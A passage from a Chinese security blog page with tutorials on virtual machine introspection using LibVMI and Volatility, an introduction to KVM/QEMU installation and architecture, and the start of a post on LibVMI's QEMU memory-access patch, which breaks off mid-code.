<h3 id="0x04-虚拟机监控Libvmi"><a href="#0x04-虚拟机监控Libvmi" class="headerlink" title="0x04 虚拟机监控Libvmi"></a>0x04 虚拟机监控Libvmi</h3><p>Libvmi是一套能从底层二进制信息重构虚拟机上层语义的C语言API。由于hypervisor(VMM)获取的全是客户机的二进制比特，用户为了从外部（比如宿主机)监控客户机的行为需要理解客户机上层的语义，比如客户机正在运行的进程列表、模块列表等信息，这种二进制到上层语义之间的gap称之为语义鸿沟（semantic gap)，从外部监控客户机的行为称之为虚拟机自省（VM Introspection）。 Libvmi提供的API，能够读取物理内存、虚拟内存、符号表（System.map）、暂停/打开虚拟机、接收内存与寄存器事件的通知等，让用户能很方便的构建插件，来读取进程列表、模块列表等信息（大部分linux原生监控工具都可以通过libvmi来构建). </p>
<p>Libvmi目前支持Intel,AMD64以及ARM系统结构，支持的虚拟机平台包括XEN与KVM/QEMU，支持的被监控系统类型包括windows和linux. Libvmi从Xenaccess发展而来，要了解其详细原理，可参考论文<a href="https://www.acsac.org/2007/papers/138.pdf" target="_blank" rel="external">Secure and Flexible Monitoring of Virtual Machines</a>以及官方主页<a href="http://libvmi.com/" target="_blank" rel="external">libvmi</a>.</p>
<p>安装libvmi:</p>
<p>先安装其依赖的包，注，这里针对KVM/QEMU，关于XEN依赖的包，会有所不同，可参考<a href="http://libvmi.com/docs/gcode-install.html" target="_blank" rel="external">libvmi-installation</a></p>
<pre><code>apt-get install automake autoconf
apt-get install libtool
apt-get install flex bison
apt-get install check
</code></pre><p>下载libvmi-0.10.1.tar.gz</p>
<pre><code>tar xvf libvmi-0.10.1.tar.gz
</code></pre><p>安装    </p>
<pre><code>cd libvmi-0.10.1
./autogen.sh
./congfigure
make 
make install
ldconfig
</code></pre><p>libvmi提供了很多plugin examples在/libvmi/examples文件夹中，<br>要运行其中的plugin（比如process-list，列举客户机中进程信息，类似linux的原生ls命令), 首先要找出客户机符号表中的一些偏移信息. libvmi提供了获取偏移信息的工具在/libvmi/tools/linux-offset-finder/ 文件夹中，将其拷贝到虚拟机中，make编译，生成了一个内核模块findoffset.ko，执行insmod findoffset.ko将其插入内核中，<br> 再执行dmesg 将得到的偏移信息，如：</p>
<pre><code>ostype = &quot;Linux&quot;;
//sysmap = &quot;/boot/System.map-3.2.0-29-generic&quot;;
linux_name = 0x470;
linux_tasks = 0x248;
linux_mm=0x280;
linux_pid=0x2bc;
linux_pgd=0x58;
</code></pre><p>写进宿主机的/libvmi/etc/libvmi-example.conf中，将libvmi-example.conf拷贝到/etc/libvmi.conf或者\$HOME/etc/libvmi.conf中,注，这里libvmi会在/etc/libvmi.conf或者\$HOME/etc/libvmi.conf中读取偏移信息。另外，这里的sysmap路径是host主机的路径，需要把guest中的System.map文件拷贝到host主机上。(还发现一个问题，虚拟机的名字不能全以数字命名，比如120432,不然在读取libvmi.conf配置文件时会出错).</p>
<p>之后运行</p>
<pre><code>/libvmi/examples/process-list ubuntudemo 
</code></pre><p>这里ubuntudemo是创建的虚拟机名字。以下是列出的部分信息：</p>
<pre><code>Process listing for VM ubuntudemo (id=3)
Next list entry is at: ffff88003d638248
[    0] swapper/0 (struct addr:ffffffff81c0d020)
[    1] init (struct addr:ffff88003d638000)
[    2] kthreadd (struct addr:ffff88003d639700)
[    3] ksoftirqd/0 (struct addr:ffff88003d63ae00)
[    6] migration/0 (struct addr:ffff88003d658000)
[    7] watchdog/0 (struct addr:ffff88003d659700)
[    8] cpuset (struct addr:ffff88003d65ae00)
[    9] khelper (struct addr:ffff88003d65c500)
[   10] kdevtmpfs (struct addr:ffff88003d65dc00)
[   11] netns (struct addr:ffff88003d698000)
[   12] sync_supers (struct addr:ffff88003d699700)
</code></pre><p>Libvmi提供的plugins有限，用户可根据需要编写，也可利用取证工具volatlity做更高层次语义的分析。Libvmi支持python绑定，提供了与volatility绑定的接口，具体可见下文。</p>
<p>###0x05 虚拟机监控Volatility  </p>
<p>Volatility是一个用python编写的内存分析工具，与libvmi（利用sysystem.map符号表信息)不同的是，volatility利用可执行文件elf中的调试信息（dwarf格式）以及system.map符号表信息来获取更丰富的变量和函数语义。其支持windows， linux以及mac。 文中以Linux为例。</p>
<p>Get Started:</p>
<p>下载volatility包</p>
<pre><code>git clone https://github.com/volatilityfoundation/volatility.git
</code></pre><p>创建Linux profile</p>
<p>profile是个zip文件，包含内核数据结构以及调试信息，也就是dwarf文件（volatility称之为vtypes)与system.map的压缩包。</p>
<p>volatility提供了一个内核模块在/volatility/tools/linux文件夹下来获取vtypes信息，将文件夹内容拷贝到要分析的客户机中，编译make，生成module.dwarf文件。在此之前请确保客户机中以及安装dwarfdump (apt-get install dwarfdump）。之后执行 head module.dwarf，会显示以下内容:</p>
<pre><code>.debug_info

&lt;0&gt;&lt;0+11&gt;&lt;DW_TAG_compile_unit&gt; DW_AT_producer&lt;GNU C 4.6.3&gt; DW_AT_language&lt;DW_LANG_C89&gt;.....

&lt;1&gt;&lt;45&gt;&lt;DW_TAG_typedef&gt; DW_AT_name&lt;__s8&gt; DW_AT_decl_file&lt;1 include/asm-generic/int-ll64.h&gt;.....
</code></pre><p>生成</p>
<p>接着将module.dwarf文件以及/boot/System.map-3.2.0-99-generic 文件（不同系统文件名不同）压缩成一个zip文件，如Ubuntu1204.zip。执行：</p>
<pre><code>zip volatility/volatility/plugins/overlays/linux/Ubuntu1204.zip volatility/tools/linux/module.dwarf /boot/System.map-3.2.0-99-generic
</code></pre><p>使用profile</p>
<pre><code>python vol.py --info | grep Linux 
</code></pre><p> 这时会显示之前创建的profile名，Linuxubuntu1204x64.</p>
<pre><code>LinuxUbuntu1204x64    - A Profile for Linux Ubuntu1204 x64 &lt;=== This is the one we just created
</code></pre><p>绑定libvmi的python接口</p>
<p>在./volatility/plugins/addrspaces 有针对不同内存快照的物理地址空间，如vmware.py,lime.py，crash.py等。libvmi则提供了pyvmi接口，在/libvmi/tools/pyvmi文件夹中有个pyvmiaddressspace.py文件可供volatility使用，（若需要自己编写python程序，则需要build pyvmi，build过程可参见其中的README文件，若出现编译错误，请确保安装 apt-get install build-essentials, apt-get install python2.7-dev).<br>将pyvmiaddressspace.py文件拷贝至./volatility/plugins/addrespaces文件夹中便可以利用volatility的plugins来分析虚拟机的内存了。以linux_pslist plugin为例，执行：</p>
<pre><code>python vol.py -l vmi://ubuntudemo --profile=Linuxubuntu1204x64 linux_pslist  
</code></pre><p>若出现distorm3（反编译库)相关错误，请确保已经安装distorm3</p>
<pre><code>apt-get install python-pip
pip install distorm3
</code></pre><p>绑定pyvmi接口后，volatility所有的plugins都可以用来分析虚拟机内存。 </p>
<p>完</p>
<hr>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="http://libvmi.com/" target="_blank" rel="external">Libvmi</a></p>
<p><a href="http://libvirt.org/" target="_blank" rel="external">Libvirt</a></p>
<p><a href="https://github.com/volatilityfoundation/volatility/wiki" target="_blank" rel="external">Volatility wiki</a></p>
<p><a href="https://www.acsac.org/2007/papers/138.pdf" target="_blank" rel="external">Secure and Flexible Monitoring of Virtual Machines</a></p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/virtualizationcomprehensive/" target="_blank" rel="external">虚拟化环境搭建、管理、监控与分析</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/虚拟化综合/">虚拟化综合</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Introspection/">Introspection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KVM/">KVM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Libvmi/">Libvmi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/QEMU/">QEMU</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Volatility/">Volatility</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-kvmqemuintro"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170102/kvmqemuintro/">KVM/QEMU虚拟化简介</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170102/kvmqemuintro/" class="article-date">
	  <time datetime="2017-01-02T07:53:39.000Z" itemprop="datePublished">一月 2, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/01/02/kvm-qemu-bytalk/" target="_blank" rel="external">个人博客</a>，主要介绍KVM/QEMU虚拟化基础，对认识KVM与QEMU之间的关系有很大帮助。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/kvmqemuintro/" target="_blank" rel="external">KVM/QEMU虚拟化简介</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
<hr>
<blockquote>
<ul>
<li>0X01 KVM/Qemu选择与部署</li>
<li>0X02 KVM/Qemu原理概览</li>
</ul>
</blockquote>
<h3 id="0X01-KVM-Qemu选择与部署"><a href="#0X01-KVM-Qemu选择与部署" class="headerlink" title="0X01 KVM/Qemu选择与部署"></a>0X01 KVM/Qemu选择与部署</h3><p>KVM作为虚拟机监控器VMM，分为两部分，分别是运行于kernel模式的KVM内核模块（kvm-kmod)和运行于user模式的Qemu模块。KVM的具体实现下文会作简单介绍。先来看kvm-kmod部分，linux kernel从2.6版本开始便开始集成了KVM模块，如果你只想简单的使用KVM，只需简单编译和配置内科即可使用KVM的一切特性，这里不作介绍，如果你想基于KVM做开发，还是老老实实去<a href="http://sourceforge.net/projects/kvm/files/" target="_blank" rel="external">kvm官网</a>下载，自己源码安装吧，在选择KVM版本之前，可以打开任意一个版本例如kvm-kmod-3.8里面的configure文件，可看到以下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"># minimum is 2.6.x</div><div class="line">min_kernel_version=24</div><div class="line"># maximum is 3.x</div><div class="line">max_kernel_version=8</div><div class="line">kernel_version=`echo $kernel_version_str | sed &apos;s/\([0-9]*\)\.[0-9]*\.[0-9]*.*/\1/&apos;`</div><div class="line">kernel_patchlevel=`echo $kernel_version_str | sed &apos;s/[0-9]*\.\([0-9]*\)\.[0-9]*.*/\1/&apos;`</div><div class="line">kernel_sublevel=`echo $kernel_version_str | sed &apos;s/[0-9]*\.[0-9]*\.\([0-9]*\).*/\1/&apos;`</div><div class="line">if [ ! -n &quot;$force_build&quot; ]; then</div><div class="line">	if [ $kernel_version -eq 2 ] &amp;&amp; [ $kernel_sublevel -lt $min_kernel_version ]; then</div><div class="line">		echo</div><div class="line">		echo &quot;Error: kernel is too old for this kvm-kmod release.&quot;</div><div class="line">		echo</div><div class="line">		exit 1</div><div class="line">	elif [ $kernel_version -eq 3 ] &amp;&amp; [ $kernel_patchlevel -gt $max_kernel_version ]; then</div><div class="line">		echo</div><div class="line">		echo &quot;Error: kernel is more recent than KVM modules delivered with this release.&quot;</div><div class="line">		echo &quot;You probably want to use the KVM support that is already part of your kernel.&quot;</div><div class="line">		echo</div><div class="line">		exit 1</div><div class="line">	fi</div><div class="line">fi</div></pre></td></tr></table></figure></p>
<p>这段代码仔细看看，就不难看出kvm-kmod版本的每个数字和kernel版本号都是有关联的，kvm-kmod毕竟是一个内核模块，必须去适应内核，大家如果在安装kvm-kmod时出现kernel is too old 或者kernel is more recent等错误就应该静下来好好看看这段代码了。下载后匹配的kvm-kmod后，安装很简单，只需要执行<code>./configure
make $$ make install</code>即可</p>
<p>安装之后，有两个模块<code>kvm.ko kvm-intel.ko</code>便会生成在./kvm/x86文件夹中，执行<code>insmod kvm.ko kvm-intel.ko</code> 或者<code>modprobe kvm.ko kvm-intel.ko</code>，便成功将kvm模块加载到内核了，<br>如果期间出现错误，可执行<code>lsmod | grep kvm</code> 看kvm是否成功加载，或执行<code>dmesg | grep kvm</code>查看具体执行信息。<br>这里强调，kvm-kmod是内核的一个模块，可随时加载随时删除，因此基于kvm的开发，修改kvm的源码之后，编译与运行起来都很方便。</p>
<p>qemu-kvm是为兼容kvm基于qemu模拟器开发出来的一个分支版本，安装qemu-kvm之前，检查是否有以下依赖包： <code>linux-kernel-headers zlib1g-dev libglib2.0-dev</code>，如果没有<code>apt-get install</code>一下。<br>之后,执行：</p>
<pre><code>./configure --prefix=/usr/local/kvm 
make &amp;&amp; make install
</code></pre><p>即可，qemu-kvm便会安装到/usr/local/kvm路径下，安装成功后，会在此路径的/bin文件夹下出现qemu-img, qemu-system-x86_64等二进制文件,自己也可以选择将这些二进制文件拷贝到根目录下的/bin文件夹中，这样在执行这些二进制文件的时候就不用加前缀/usr/local/kvm/bin了。<br>执行：</p>
<pre><code>/usr/local/kvm/bin/qemu-img create -f qcow2 imgname.img 10G 
</code></pre><p>创建一个qcow2格式的空虚拟机img文件<br>执行： </p>
<pre><code>/usr/local/kvm/bin/qemu-system-x86_64 -hda imgname.img -m 1024 -vnc :1 -cdrom imgname.iso -boot d     
</code></pre><p>将imgname.iso系统安装到imgname.img中<br>之后利用xvnc4viewer等vnc软件连接虚拟机完成安装过程，安装完后，执行:</p>
<pre><code>/usr/local/kvm/bin/qemu-system-x86_64 -hda imgname.img -vnc :1 -m 1024 -monitor stdio  
</code></pre><p>登陆到虚拟机。具体细节可自行摸索。</p>
<h3 id="0X02-KVM-Qemu原理概览"><a href="#0X02-KVM-Qemu原理概览" class="headerlink" title="0X02 KVM/Qemu原理概览"></a>0X02 KVM/Qemu原理概览</h3><p>说说kvm与qemu的关系，借用实验室某大神给的一张图：</p>
<p><img src="http://7xppf1.com1.z0.glb.clouddn.com/kvm-qemu.png" alt="kvm-qemu-rela"></p>
<p>可以看到，这里有三种模式，第一是客户机执行时所处的Guest模式，也就是虚拟化技术VMX中的非Root模式；第二是KVM运行的Kernel模式，即VMX中的Root模式，此时特权级为0；第三是Qemu运行的User模式，处于VMX Root模式中的特权级3.有关VMX技术，以及非Root模式如何通过VM Exit进入到Root模式，Root模式如何通过VM Entry进入到非Root模式，可参考Intel系统编程手册。</p>
<p>简单说说Qemu所在的User模式如何与KVM所在的kernel模式交互，虚拟化中的VT-x技术的支持，使得KVM可以虚拟出多个虚拟处理器VCPU, 而这些VCPU对应每一个Qemu线程，VCPU的创建、初始化、运行以及退出都是在Qemu线程的上下文中进行，这些过程都是通过Qemu向KVM发送一个I/O通道管理函数ioctl来完成，以qemu-kvm-1.1.2为例，qemu-kvm中首先会在<code>./linux-header/linux/kvm.h</code>注册相应的ioctl,如<code>#define KVM_GET_REGS              _IOR(KVMIO,  0x81, struct kvm_regs)</code>，各参数含义可以具体去了解ioctl的实现方式，之后调用<code>kvm_vcpu_ioctl(env,KVM_GET_REGS,&amp;regs)</code>（有些也会调用kvm_vm_ioctl），KVM-Kmod中也会注册相应的ioctl，之后真正执行时会调用KVM_Kmod的相应函数，一般会在<code>kvm_main.c</code>文件中定义。如果想自定义自己的函数，需要分别在qemu-kvm与kvm-kmod注册相应的ioctl，只要编号不重复即可，注册后再调用自己定义的函数。</p>
<p>备注：Qemu 线程以 ioctl 的方式向 KVM 内核模块发出指 示,后者执行 VM entry 操作,将处理器由 kernel 模式切换到 Guest 模式,中止宿主机软件, 转而运行客户软件。注意,宿主机软件被中止时,正处于 Qemu 线程上下文,且正在执行 ioctl 系统调用的 kernel 模式处理程序。客户软件在运行过程中,如发生异常或外部中断等事件, 或执行 I/O 操作,可能导致 VM exit,将处理器状态由 Guest 模式切换回 Kernel 模式。KVM 内核模块检查发生 VM exit 的原因,如果 VM exit 由于 I/O 操作导致,则执行系统调用返回操 作,将 I/O 操作交给处于 User 模式的 Qemu 线程来处理,Qemu 线程在处理完 I/O 操作后再 次执行 ioctl,指示 KVM 切换处理器到 Guest 模式,恢复客户软件的运行;如果 VM exit 由于 其它原因导致,则由 KVM 内核模块负责处理,并在处理后切换处理器到 Guest 模式,恢复 客户机的运行。</p>
<p>完</p>
<p>作者@<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
<p>于2016年1月1日West Lafayette, Lawson Computer Science Building.</p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/kvmqemuintro/" target="_blank" rel="external">KVM/QEMU虚拟化简介</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/虚拟化基础/">虚拟化基础</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KVM/">KVM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/QEMU/">QEMU</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-libvmikvm"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170102/libvmikvm/">KVM Support in Libvmi</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170102/libvmikvm/" class="article-date">
	  <time datetime="2017-01-02T03:02:18.000Z" itemprop="datePublished">一月 2, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者：<a href="http://ytliu.info/blog/2014/03/27/kvm-support-in-libvmi/" target="_blank" rel="external">ytliu</a><br>编辑：@Tula</p>
<hr>
<p><strong>CSysSec注</strong>： 本文介绍Libvmi对KVM的支持。作者ytliu，来自上海交通大学PhD,研究方向是虚拟化与系统安全，在顶会CCS，HPCA等发表多篇文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmikvm/" target="_blank" rel="external">Libvmi Setup</a>》</p>
<hr>
<p>Several months ago I’ve post 2 blogs to introduce <a href="http://www.csyssec.org/20170102/libvmisetup/" target="_blank" rel="external">how to setup libvmi</a> and <a href="http://www.csyssec.org/20170102/libvmiintrospection/" target="_blank" rel="external">how to write your own tools using libvmi</a>. These two posts are based on Xen virtualization environment. Today I’m trying to use Libvmi for KVM virtual machine introspection, which need more effort to do such task.</p>
<p>In the rest of this blog, I will briefly introduce why this effort need to be done and how to do that.</p>
<hr>
<p>Before we start, let’s firstly see how document in libvmi github page saying about KVM Support:</p>
<blockquote>
<ul>
<li><h5 id="If-you-would-like-LibVMI-to-work-on-KVM-VM’s-you-must-do-some-additional-setup-This-is-because-KVM-doesn’t-have-much-built-in-capability-for-introspection"><a href="#If-you-would-like-LibVMI-to-work-on-KVM-VM’s-you-must-do-some-additional-setup-This-is-because-KVM-doesn’t-have-much-built-in-capability-for-introspection" class="headerlink" title="If you would like LibVMI to work on KVM VM’s, you must do some additional setup. This is because KVM doesn’t have much built-in capability for introspection."></a>If you would like LibVMI to work on KVM VM’s, you must do some additional setup. This is because KVM doesn’t have much built-in capability for introspection.</h5></li>
<li><h5 id="You-only-need-one-memory-access-technique-LibVMI-will-first-look-for-the-QEMU-KVM-patch-and-use-that-if-it-is-installed-Otherwise-it-will-fall-back-to-using-GDB"><a href="#You-only-need-one-memory-access-technique-LibVMI-will-first-look-for-the-QEMU-KVM-patch-and-use-that-if-it-is-installed-Otherwise-it-will-fall-back-to-using-GDB" class="headerlink" title="You only need one memory access technique. LibVMI will first look for the QEMU-KVM patch and use that if it is installed. Otherwise it will fall back to using GDB."></a>You only need one memory access technique. LibVMI will first look for the QEMU-KVM patch and use that if it is installed. Otherwise it will fall back to using GDB.</h5></li>
</ul>
</blockquote>
<p>And now Libvmi provide 3 ways to support KVM introspection:</p>
<blockquote>
<ul>
<li>Enable GDB access to your KVM VM, which is the slowest approach;</li>
<li>Patch QEMU-KVM with the provided patch, which is much faster;</li>
<li>Use Shm-snapshot Support to introspect on a memory snapshot, which is the fatest one.</li>
</ul>
</blockquote>
<p>In this blog, I’ll not consider the GDB method since it will introduce much overhead, and only discuss about the second QEMU-KVM patch way. While the third Shm-snapshot will be introduced in the future.</p>
<p>So as far as I’m concerned, why Libvmi require applying a qemu patch to introspect KVM virtual machine is for following reasons:</p>
<blockquote>
<ul>
<li>Libvmi use libvirt framework API to manage and get data from guest virtual machine;</li>
<li>However, unlike libxenctrl used in Xen, libvirt for KVM does not provide any API to map Guest Physical Address (GPA) to Host Virtual Address (HVA);</li>
<li>While in qemu, there is a function called <code>cpu_physical_memory_map</code> in <code>qemu/exec.c</code> file which can map guest GPA to HVA.</li>
</ul>
</blockquote>
<p>So what the patch actually do is use Qemu Machine Protocal (QMP) mechanism for libvmi to pass the GPA, and call the internal function <code>cpu_physical_memory_map</code> located in <code>qemu/exec.c</code> in Qemu, and finally get the mapped HVA back.</p>
<hr>
<p>Actually the patch are used for some specific qemu versions, so I think I should just tell why it works, and how to make it work in general.</p>
<h4 id="Create-a-connection-inside-Qemu-for-Libvmi-to-communicate"><a href="#Create-a-connection-inside-Qemu-for-Libvmi-to-communicate" class="headerlink" title="Create a connection inside Qemu for Libvmi to communicate"></a>Create a connection inside Qemu for Libvmi to communicate</h4><p>The entry function is <code>do_physical_memory_access()</code>, we can put it anywhere, for example, Libvmi patch put it in <code>qemu/monitor.c</code> file:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_physical_memory_access</span><span class="params">(Monitor *mon, <span class="keyword">const</span> QDict *qdict, QObject **ret_data)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *path = qdict_get_str(qdict, <span class="string">"path"</span>);</div><div class="line">  memory_access_start(path);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>This function will have a input parameter <code>path</code>，with which to invoke <code>memory_access_start()</code> function:</p>
<p>(Note: The following code are all located in <code>qemu/memory-access.c</code>)<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">memory_access_start</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path)</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">pthread_t</span> thread;</div><div class="line">  <span class="keyword">sigset_t</span> <span class="built_in">set</span>, oldset;</div><div class="line">  <span class="keyword">int</span> ret;</div><div class="line"></div><div class="line">  <span class="comment">// create a copy of path that we can safely use</span></div><div class="line">  <span class="keyword">char</span> *pathcopy = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(path) + <span class="number">1</span>);</div><div class="line">  <span class="built_in">memcpy</span>(pathcopy, path, <span class="built_in">strlen</span>(path) + <span class="number">1</span>);</div><div class="line"></div><div class="line">  <span class="comment">// start the thread</span></div><div class="line">  sigfillset(&amp;<span class="built_in">set</span>);</div><div class="line">  pthread_sigmask(SIG_SETMASK, &amp;<span class="built_in">set</span>, &amp;oldset);</div><div class="line">  ret = pthread_create(&amp;thread, <span class="literal">NULL</span>, memory_access_thread, pathcopy);</div><div class="line">  pthread_sigmask(SIG_SETMASK, &amp;oldset, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">  <span class="keyword">return</span> ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>This function will create a new thread, and run the <code>memory_access_thread()</code> function:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></div><div class="line"><span class="title">memory_access_thread</span> <span class="params">(<span class="keyword">void</span> *path)</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> sockaddr_un address;</div><div class="line">  <span class="keyword">int</span> socket_fd, connection_fd;</div><div class="line">  <span class="keyword">socklen_t</span> address_length;</div><div class="line"></div><div class="line">  socket_fd = socket(PF_UNIX, SOCK_STREAM, <span class="number">0</span>);</div><div class="line">  <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>)&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"QemuMemoryAccess: socket failed\n"</span>);</div><div class="line">    <span class="keyword">goto</span> error_exit;</div><div class="line">  &#125;</div><div class="line">  unlink(path);</div><div class="line">  address.sun_family = AF_UNIX;</div><div class="line">  address_length = <span class="keyword">sizeof</span>(address.sun_family) + <span class="built_in">sprintf</span>(address.sun_path, <span class="string">"%s"</span>, (<span class="keyword">char</span> *) path);</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (bind(socket_fd, (<span class="keyword">struct</span> sockaddr *) &amp;address, address_length) != <span class="number">0</span>)&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"QemuMemoryAccess: bind failed\n"</span>);</div><div class="line">  <span class="keyword">goto</span> error_exit;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (listen(socket_fd, <span class="number">0</span>) != <span class="number">0</span>)&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"QemuMemoryAccess: listen failed\n"</span>);</div><div class="line">  <span class="keyword">goto</span> error_exit;</div><div class="line">&#125;</div><div class="line"></div><div class="line">connection_fd = accept(socket_fd, (<span class="keyword">struct</span> sockaddr *) &amp;address, &amp;address_length);</div><div class="line">connection_handler(connection_fd);</div><div class="line"></div><div class="line">close(socket_fd);</div><div class="line">unlink(path);</div><div class="line">error_exit:</div><div class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>This function will create a socket, combine it with the <code>/tmp/path</code> named file, bind, listen for connection, and once any other process connect to such socket, it will invoke the <code>connection_handler()</code> function:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">connection_handler</span> <span 